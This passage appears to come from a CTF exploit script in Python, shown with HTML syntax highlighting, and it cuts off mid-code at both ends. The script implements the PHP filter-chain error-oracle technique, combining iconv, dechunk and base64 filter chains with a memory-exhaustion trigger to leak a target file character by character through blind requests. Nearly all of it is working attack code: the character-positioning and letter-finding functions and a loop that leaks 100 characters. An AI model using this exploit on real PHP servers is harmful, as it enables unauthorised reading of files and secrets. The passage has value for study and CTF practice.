class="hljs-string">bafedcjihg+0DAD3D3+0DAD3Dw==</span><br><span class="hljs-string"></span><br><span class="hljs-string">Then apply r4 once more:</span><br><span class="hljs-string">efabijcd0+gh3DAD0+3D3DAD==wD</span><br><span class="hljs-string"></span><br><span class="hljs-string">And here&#x27;s the cute part: not only have we now accessed the 5th and 6th chars of the string, but</span><br><span class="hljs-string">the string still has two equals signs in it, so we can reapply the technique as many times as we</span><br><span class="hljs-string">want, to access all the characters in the string ;)</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>flip = <span class="hljs-string">&quot;convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode&quot;</span><br>r2 = <span class="hljs-string">&quot;convert.iconv.CSUNICODE.UCS-2BE&quot;</span><br>r4 = <span class="hljs-string">&quot;convert.iconv.UCS-4LE.10646-1:1993&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_nth</span>(<span class="hljs-params">n</span>):<br><span class="hljs-keyword">global</span> flip, r2, r4<br>o = []<br>chunk = n // <span class="hljs-number">2</span><br><span class="hljs-keyword">if</span> chunk % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>: o.append(r4)<br>o.extend([flip, r4] * (chunk // <span class="hljs-number">2</span>))<br><span class="hljs-keyword">if</span> (n % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>) ^ (chunk % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>): o.append(r2)<br><span class="hljs-keyword">return</span> join(*o)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Step 3:</span><br><span class="hljs-string">This is the longest but actually easiest part. We can use dechunk oracle to figure out if the first</span><br><span class="hljs-string">char is 0-9A-Fa-f. So it&#x27;s just a matter of finding filters which translate to or from those</span><br><span class="hljs-string">chars. rot13 and string lower are helpful. There are probably a million ways to do this bit but</span><br><span class="hljs-string">I just bruteforced every combination of iconv filters to find these.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Numbers are a bit trickier because iconv doesn&#x27;t tend to touch them.</span><br><span class="hljs-string">In the CTF you coud porbably just guess from there once you have the letters. But if you actually </span><br><span class="hljs-string">want a full leak you can base64 encode a third time and use the first two letters of the resulting</span><br><span class="hljs-string">string to figure out which number it is.</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>rot1 = <span class="hljs-string">&#x27;convert.iconv.437.CP930&#x27;</span><br>be = <span class="hljs-string">&#x27;convert.quoted-printable-encode|convert.iconv..UTF7|convert.base64-decode|convert.base64-encode&#x27;</span><br>o = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_letter</span>(<span class="hljs-params">prefix</span>):<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># a-f A-F 0-9</span><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># a-e</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br><span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|&#x27;</span> + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|&#x27;</span>*(n+<span class="hljs-number">1</span>) + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;edcba&#x27;</span>[n]<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># A-E</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br><span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|&#x27;</span> + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|&#x27;</span>*(n+<span class="hljs-number">1</span>) + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;EDCBA&#x27;</span>[n]<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|convert.iconv.CSISO5427CYRILLIC.855|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;*&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|convert.iconv.CP1390.CSIBM932|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># f</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;f&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># F</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;F&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># n-s N-S</span><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># n-r</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br><span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|&#x27;</span> + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|&#x27;</span>*(n+<span class="hljs-number">1</span>) + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;rqpon&#x27;</span>[n]<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># N-R</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br><span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|&#x27;</span> + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|&#x27;</span>*(n+<span class="hljs-number">1</span>) + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;RQPON&#x27;</span>[n]<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># s</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;s&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># S</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;S&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># i j k</span><br><span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;k&#x27;</span><br><span class="hljs-keyword">elif</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;j&#x27;</span><br><span class="hljs-keyword">elif</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;i&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># I J K</span><br><span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;K&#x27;</span><br><span class="hljs-keyword">elif</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;J&#x27;</span><br><span class="hljs-keyword">elif</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;I&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># v w x</span><br><span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;x&#x27;</span><br><span class="hljs-keyword">elif</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;w&#x27;</span><br><span class="hljs-keyword">elif</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;v&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># V W X</span><br><span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;X&#x27;</span><br><span class="hljs-keyword">elif</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;W&#x27;</span><br><span class="hljs-keyword">elif</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;V&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|convert.iconv.CP285.CP280|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># Z</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Z&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># z</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;z&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.CP285.CP280|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># M</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;M&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># m</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;m&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|convert.iconv.CP273.CP1122|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># y</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;y&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|convert.iconv.CP273.CP1122|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># Y</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Y&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># l</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;l&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># L</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;L&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># h</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;h&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># H</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;H&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># u</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;u&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># U</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;U&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|convert.iconv.CP1390.CSIBM932|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># g</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;g&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># G</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;G&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># t</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;t&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># T</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;T&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><br><span class="hljs-built_in">print</span>()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>prefix = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;header&#125;</span>|<span class="hljs-subst">&#123;get_nth(i)&#125;</span>&#x27;</span><br>letter = find_letter(prefix)<br><span class="hljs-comment"># it&#x27;s a number! check base64</span><br><span class="hljs-keyword">if</span> letter == <span class="hljs-string">&#x27;*&#x27;</span>:<br>prefix = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;header&#125;</span>|<span class="hljs-subst">&#123;get_nth(i)&#125;</span>|convert.base64-encode&#x27;</span><br>s = find_letter(prefix)<br><span class="hljs-keyword">if</span> s == <span class="hljs-string">&#x27;M&#x27;</span>:<br><span class="hljs-comment"># 0 - 3</span><br>prefix = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;header&#125;</span>|<span class="hljs-subst">&#123;get_nth(i)&#125;</span>|convert.base64-encode|<span class="hljs-subst">&#123;r2&#125;</span>&#x27;</span><br>ss = find_letter(prefix)<br><span class="hljs-keyword">if</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;CDEFGH&#x27;</span>:<br>letter = <span class="hljs-string">&#x27;0&#x27;</span><br><span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;STUVWX&#x27;</span>:<br>letter = <span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;ijklmn&#x27;</span>:<br>letter = <span class="hljs-string">&#x27;2&#x27;</span><br><span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;yz*&#x27;</span>:<br>letter = <span class="hljs-string">&#x27;3&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">f&#x27;bad num (<span class="hljs-subst">&#123;ss&#125;</span>)&#x27;</span>)<br><span class="hljs-keyword">elif</span> s == <span class="hljs-string">&#x27;N&#x27;</span>:<br><span class="hljs-comment"># 4 - 7</span><br>prefix = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;header&#125;</span>|<span class="hljs-subst">&#123;get_nth(i)&#125;</span>|convert.base64-encode|<span class="hljs-subst">&#123;r2&#125;</span>&#x27;</span><br>ss = find_letter(prefix)<br><span class="hljs-keyword">if</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;CDEFGH&#x27;</span>:<br>letter = <span class="hljs-string">&#x27;4&#x27;</span><br><span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;STUVWX&#x27;</span>:<br>letter = <span class="hljs-string">&#x27;5&#x27;</span><br><span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;ijklmn&#x27;</span>:<br>letter = <span class="hljs-string">&#x27;6&#x27;</span><br><span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;yz*&#x27;</span>:<br>letter = <span class="hljs-string">&#x27;7&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">f&#x27;bad num (<span class="hljs-subst">&#123;ss&#125;</span>)&#x27;</span>)<br><span class="hljs-keyword">elif</span> s == <span class="hljs-string">&#x27;O&#x27;</span>:<br><span class="hljs-comment"># 8 - 9</span><br>prefix = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;header&#125;</span>|<span class="hljs-subst">&#123;get_nth(i)&#125;</span>|convert.base64-encode|<span class="hljs-subst">&#123;r2&#125;</span>&#x27;</span><br>ss = find_letter(prefix)<br><span class="hljs-keyword">if</span> ss <span 